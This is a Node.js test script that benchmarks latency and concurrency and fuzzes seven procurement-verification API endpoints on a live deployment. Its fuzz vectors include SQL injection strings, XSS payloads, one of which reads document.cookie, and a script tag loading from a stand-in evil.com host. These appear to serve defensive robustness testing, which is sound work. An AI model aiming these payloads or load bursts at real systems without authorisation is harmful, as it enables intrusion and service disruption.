import fs from 'node:fs';
import path from 'node:path';
import { performance } from 'node:perf_hooks';

const BASE_URL = 'https://praman-desk.vercel.app';

const ENDPOINTS = [
  {
    name: 'po-verify',
    path: '/api/miner/po-verify',
    validGet: '?po_number=PO-2026-7741&vendor=SAP%20SE&amount=18500000&approval_cap=10000000',
    validPost: { po_number: 'PO-2026-7741', vendor: 'SAP SE', amount: 18500000, approval_cap: 10000000 }
  },
  {
    name: 'invoice-reconcile',
    path: '/api/miner/invoice-reconcile',
    validGet: '?invoice=INV-100%20amount%20USD%205000&ledger=LED-100%20amount%20USD%205000',
    validPost: { invoice: 'INV-100 USD 5000.00', ledger: 'LED-100 USD 5000.00' }
  },
  {
    name: 'vendor-verify',
    path: '/api/miner/vendor-verify',
    validGet: '?vendor=SAP%20SE&vat_number=DE143454238',
    validPost: { vendor: 'SAP SE', vat_number: 'DE143454238' }
  },
  {
    name: 'doc-authenticity',
    path: '/api/miner/doc-authenticity',
    validGet: '?document=NIC-EINV-2026-9901&hash=64a9b2c1d8e7f0123456789abcdef0123456789abcdef0123456789abcdef012',
    validPost: { document: 'NIC-EINV-2026-9901', hash: '64a9b2c1d8e7f0123456789abcdef0123456789abcdef0123456789abcdef012' }
  },
  {
    name: 'corporate-registry',
    path: '/api/miner/corporate-registry',
    validGet: '?name=SAP%20SE&jurisdiction=DE',
    validPost: { name: 'SAP SE', jurisdiction: 'DE' }
  },
  {
    name: 'sanctions-screen',
    path: '/api/miner/sanctions-screen',
    validGet: '?name=Banco%20Nacional%20de%20Cuba',
    validPost: { name: 'Banco Nacional de Cuba' }
  },
  {
    name: 'regulatory-filing',
    path: '/api/miner/regulatory-filing',
    validGet: '?company=Goldman%20Sachs&period=2026',
    validPost: { company: 'Goldman Sachs', period: '2026' }
  }
];

function percentile(arr, p) {
  if (arr.length === 0) return 0;
  const sorted = [...arr].sort((a, b) => a - b);
  const index = Math.ceil((p / 100) * sorted.length) - 1;
  return sorted[Math.max(0, Math.min(index, sorted.length - 1))];
}

async function runTimedRequest(url, options = {}) {
  const start = performance.now();
  try {
    const res = await fetch(url, options);
    const duration = performance.now() - start;
    const text = await res.text();
    let json = null;
    try { json = JSON.parse(text); } catch {}
    return {
      status: res.status,
      duration,
      ok: res.ok,
      json,
      textLength: text.length,
      headers: Object.fromEntries(res.headers.entries())
    };
  } catch (err) {
    const duration = performance.now() - start;
    return {
      status: 0,
      duration,
      ok: false,
      error: err.message
    };
  }
}

async function runConcurrencyBenchmark() {
  console.log('===============================================================');
  console.log('BATTERY 1A: PRODUCTION CONCURRENCY & LATENCY BENCHMARK');
  console.log(`Target: ${BASE_URL}`);
  console.log('===============================================================\n');

  // Measure cold vs warm start
  console.log('--- Cold Start vs Warm Start Latency Probe ---');
  const coldResults = {};
  for (const ep of ENDPOINTS) {
    const url = `${BASE_URL}${ep.path}${ep.validGet}`;
    const cold = await runTimedRequest(url);
    const warm1 = await runTimedRequest(url);
    const warm2 = await runTimedRequest(url);
    coldResults[ep.name] = {
      coldMs: Math.round(cold.duration),
      warm1Ms: Math.round(warm1.duration),
      warm2Ms: Math.round(warm2.duration),
      status: cold.status
    };
    console.log(`Endpoint: ${ep.name.padEnd(20)} | Cold: ${cold.duration.toFixed(1).padStart(7)}ms | Warm1: ${warm1.duration.toFixed(1).padStart(6)}ms | Warm2: ${warm2.duration.toFixed(1).padStart(6)}ms | Status: ${cold.status}`);
  }

  // Concurrency benchmark: 35 concurrent requests per endpoint (7 * 35 = 245 requests)
  console.log('\n--- Concurrency Burst Test (35 concurrent requests per endpoint) ---');
  const benchmarkStats = {};

  for (const ep of ENDPOINTS) {
    process.stdout.write(`Benchmarking ${ep.name}... `);
    const CONCURRENCY = 35;
    const url = `${BASE_URL}${ep.path}${ep.validGet}`;
    const startAll = performance.now();
    const promises = Array.from({ length: CONCURRENCY }, () => runTimedRequest(url));
    const results = await Promise.all(promises);
    const totalDurationSec = (performance.now() - startAll) / 1000;

    const durations = results.map(r => r.duration);
    const statuses = results.map(r => r.status);
    const successCount = statuses.filter(s => s >= 200 && s < 300).length;
    const errorCount = CONCURRENCY - successCount;
    const throughput = CONCURRENCY / totalDurationSec;

    benchmarkStats[ep.name] = {
      concurrency: CONCURRENCY,
      totalDurationSec: totalDurationSec.toFixed(2),
      throughput: throughput.toFixed(2),
      successRate: `${((successCount / CONCURRENCY) * 100).toFixed(1)}%`,
      p50: Math.round(percentile(durations, 50)),
      p95: Math.round(percentile(durations, 95)),
      p99: Math.round(percentile(durations, 99)),
      min: Math.round(Math.min(...durations)),
      max: Math.round(Math.max(...durations)),
      avg: Math.round(durations.reduce((a, b) => a + b, 0) / durations.length),
      statusBreakdown: statuses.reduce((acc, s) => { acc[s] = (acc[s] || 0) + 1; return acc; }, {})
    };
    console.log(`Done. Throughput: ${throughput.toFixed(1)} req/s | p50: ${benchmarkStats[ep.name].p50}ms | p95: ${benchmarkStats[ep.name].p95}ms | p99: ${benchmarkStats[ep.name].p99}ms | Statuses: ${JSON.stringify(benchmarkStats[ep.name].statusBreakdown)}`);
  }

  // Mixed concurrent burst: 7 endpoints simultaneous firing (5 requests each = 35 parallel across all endpoints)
  console.log('\n--- Global Mixed Burst Test (50 total concurrent requests across all 7 endpoints) ---');
  const mixedPromises = [];
  for (let i = 0; i < 50; i++) {
    const ep = ENDPOINTS[i % ENDPOINTS.length];
    mixedPromises.push(runTimedRequest(`${BASE_URL}${ep.path}${ep.validGet}`));
  }
  const mixedStart = performance.now();
  const mixedResults = await Promise.all(mixedPromises);
  const mixedDurationSec = (performance.now() - mixedStart) / 1000;
  const mixedDurations = mixedResults.map(r => r.duration);
  const mixedSuccess = mixedResults.filter(r => r.status >= 200 && r.status < 300).length;

  const mixedStats = {
    totalRequests: 50,
    durationSec: mixedDurationSec.toFixed(2),
    throughput: (50 / mixedDurationSec).toFixed(2),
    successRate: `${((mixedSuccess / 50) * 100).toFixed(1)}%`,
    p50: Math.round(percentile(mixedDurations, 50)),
    p95: Math.round(percentile(mixedDurations, 95)),
    p99: Math.round(percentile(mixedDurations, 99)),
    statuses: mixedResults.reduce((acc, r) => { acc[r.status] = (acc[r.status] || 0) + 1; return acc; }, {})
  };
  console.log(`Global Mixed Burst: ${mixedStats.throughput} req/s | p50: ${mixedStats.p50}ms | p95: ${mixedStats.p95}ms | p99: ${mixedStats.p99}ms | Success: ${mixedStats.successRate} | Breakdown: ${JSON.stringify(mixedStats.statuses)}`);

  return { coldResults, benchmarkStats, mixedStats };
}

async function runFuzzTesting() {
  console.log('\n===============================================================');
  console.log('BATTERY 1B: ADVERSARIAL FUZZ & MALFORMED PAYLOAD INJECTION');
  console.log('===============================================================\n');

  const FUZZ_VECTORS = [
    {
      id: 'MALFORMED_JSON',
      desc: 'Invalid truncated JSON body (syntax error)',
      isRaw: true,
      headers: { 'Content-Type': 'application/json' },
      body: '{"po_number": "PO-123", "amount": '
    },
    {
      id: 'EMPTY_BODY',
      desc: 'Empty string POST body with application/json header',
      isRaw: true,
      headers: { 'Content-Type': 'application/json' },
      body: ''
    },
    {
      id: 'EMPTY_JSON_OBJECT',
      desc: 'Empty JSON object {}',
      payload: {}
    },
    {
      id: 'ASTRONOMICAL_INTEGER',
      desc: '10^30 number / huge float representation',
      payload: {
        amount: 1e30,
        approval_cap: 1e30,
        poAmount: 1e30,
        signedQrAmount: 1e30,
        pdfFaceAmount: 1e30,
        invoice: 'INV-ASTRONOMICAL 1000000000000000000000000000000.00',
        ledger: 'LED-ASTRONOMICAL 1000000000000000000000000000000.00'
      }
    },
    {
      id: 'NEGATIVE_NUMBERS',
      desc: 'Negative amounts and negative approval thresholds',
      payload: {
        amount: -9999999999,
        approval_cap: -500000,
        poAmount: -18500000,
        signedQrAmount: -1416000,
        pdfFaceAmount: -1888000,
        invoice: 'INV-NEG -5000.00',
        ledger: 'LED-NEG -5000.00'
      }
    },
    {
      id: 'SQL_INJECTION',
      desc: 'Classic SQL injection vectors',
      payload: {
        vendor: "'; DROP TABLE miners; SELECT * FROM credentials WHERE '1'='1",
        po_number: "PO-7741' OR 1=1--",
        company: "SAP' UNION SELECT 1,2,3--",
        name: "OFAC' OR 'a'='a",
        hash: "' OR ''='"
      }
    },
    {
      id: 'XSS_HTML_INJECTION',
      desc: 'Stored/reflected XSS tags and event handlers',
      payload: {
        vendor: '<script>alert("pwned")</script>',
        company: '<img src=x onerror=alert(1)>',
        name: '<svg onload=alert(document.cookie)>',
        question: '<script src="https://evil.com/leak.js"></script>'
      }
    },
    {
      id: 'NULL_BYTE_INJECTION',
      desc: 'Null bytes and control characters',
      payload: {
        vendor: "SAP\0SE\0LLC",
        po_number: "PO-7741\0ADMIN",
        name: "Banco\0Nacional",
        company: "Goldman\0Sachs",
        hash: "64a9b2\0c1d8e7"
      }
    },
    {
      id: 'UNICODE_SURROGATES_EMOJIS',
      desc: '4-byte UTF-8 emojis and unpaired surrogate characters',
      payload: {
        vendor: '🔥🚀💀 SAP SE ﷽',
        company: '𠜎𠝹𠱓𠱸𠲖 Goldman Sachs',
        name: '💣💥⚡ Banco Nacional de Cuba',
        hash: '💥'
      }
    },
    {
      id: 'INVALID_LEI_FORMAT',
      desc: 'Corrupt and non-compliant ISO 17442 LEIs',
      payload: {
        vendor: 'Random Test Entity',
        lei: 'INVALID-LEI-12345!',
        company: '549300!INVALID@LEI#'
      }
    },
    {
      id: 'CORRUPT_SHA256_HASH',
      desc: 'Invalid length, non-hex, and odd-length SHA-256 strings',
      payload: {
        document: 'Invoice #101',
        hash: 'zzzznonhexdeadbeef64a9b2c1d8e7f0123456789abcdef0123456789abcdef01234',
        irnOrSha256: '0x123'
      }
    },
    {
      id: '1MB_LARGE_PAYLOAD',
      desc: '1MB string input in payload body',
      payload: {
        vendor: 'A'.repeat(1024 * 1024),
        po_number: 'B'.repeat(500 * 1024)
      }
    }
  ];

  const fuzzResults = [];

  for (const ep of ENDPOINTS) {
    console.log(`\n--- Fuzzing Endpoint: ${ep.name} (${ep.path}) ---`);
    for (const vec of FUZZ_VECTORS) {
      const url = `${BASE_URL}${ep.path}`;
      let options = { method: 'POST' };

      if (vec.isRaw) {
        options.headers = vec.headers;
        options.body = vec.body;
      } else {
        options.headers = { 'Content-Type': 'application/json' };
        options.body = JSON.stringify(vec.payload);
      }

      const res = await runTimedRequest(url, options);
      const is500 = res.status >= 500;
      const isClean = res.status === 200 || res.status === 400 || res.status === 413 || res.status === 422;

      const record = {
        endpoint: ep.name,
        vectorId: vec.id,
        desc: vec.desc,
        status: res.status,
        durationMs: Math.round(res.duration),
        isClean,
        is500,
        responseSnippet: typeof res.json === 'object' ? JSON.stringify(res.json).slice(0, 150) : (res.error || '').slice(0, 150)
      };

      fuzzResults.push(record);
      const flag = is500 ? '❌ UNHANDLED 500' : isClean ? '✅ CLEAN' : `⚠️ HTTP ${res.status}`;
      console.log(`  [${flag}] ${vec.id.padEnd(25)} -> Status ${res.status} (${record.durationMs}ms) | Response: ${record.responseSnippet}`);
    }
  }

  return fuzzResults;
}

async function main() {
  console.log(`Starting Systems Verification Suite against ${BASE_URL}...`);
  const benchmark = await runConcurrencyBenchmark();
  const fuzz = await runFuzzTesting();

  const outPath = path.join(process.cwd(), 'evidence', 'stress-fuzz-results.json');
  fs.writeFileSync(outPath, JSON.stringify({ benchmark, fuzz, timestamp: new Date().toISOString() }, null, 2));
  console.log(`\n\nResults saved to: ${outPath}`);
}

main().catch(console.error);
